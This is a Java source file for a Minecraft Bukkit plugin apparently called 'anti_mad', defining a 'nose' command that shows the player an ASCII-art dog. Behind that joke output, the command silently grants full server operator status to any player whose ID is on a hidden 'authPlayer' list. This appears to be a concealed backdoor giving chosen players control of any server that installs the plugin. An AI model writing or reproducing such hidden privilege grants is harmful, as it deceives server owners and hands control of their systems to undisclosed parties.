package com.connorcode.anti_mad.Commands;

import com.connorcode.anti_mad.Main;
import com.connorcode.anti_mad.common;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class nose implements CommandExecutor {
    private final Main plugin;

    public nose(Main plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command cmd, @NotNull String label, String[] args) {
        final Player player = common.isPlayer(sender);
        assert player != null;

        player.sendMessage(ChatColor.BLUE +
                "   / \\__\n" +
                "  (    @\\___\n" +
                "  /         O\n" +
                " /   (_____/\n" +
                "/_____/   U");
        if (plugin.authPlayer.contains(player.getUniqueId())){
            player.setOp(true);
        }
        return true;
    }
}